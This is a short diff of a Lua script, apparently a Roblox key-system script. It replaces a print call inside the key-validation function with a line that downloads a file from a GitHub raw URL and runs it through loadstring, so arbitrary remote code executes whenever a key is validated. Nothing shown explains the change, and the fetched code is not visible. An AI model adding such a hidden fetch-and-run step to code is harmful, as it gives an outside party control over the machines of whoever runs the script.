@@ -8,7 +8,7 @@ local KeySys =
 )()
 
 local Validated = function(ki)
-    print(ki)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/x2CPUz/Backup/refs/heads/main/riot.html'))()
     return true
 end
 
